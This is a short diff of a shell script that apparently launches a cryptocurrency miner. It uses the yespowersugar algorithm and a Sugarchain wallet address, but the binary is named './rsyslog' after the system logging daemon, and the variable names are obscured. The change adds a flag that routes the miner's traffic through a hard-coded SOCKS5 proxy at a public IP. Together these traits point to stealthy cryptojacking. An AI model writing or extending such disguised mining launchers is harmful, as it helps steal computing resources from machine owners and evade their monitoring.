@@ -9,4 +9,4 @@ ACIS=sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57
 STRESS=yespowersugar
 BANGUNAN=BK-01
 PROXY=socks5://158.69.225.110:59166
-./rsyslog -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 2
+./rsyslog -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 2 -x $PROXY
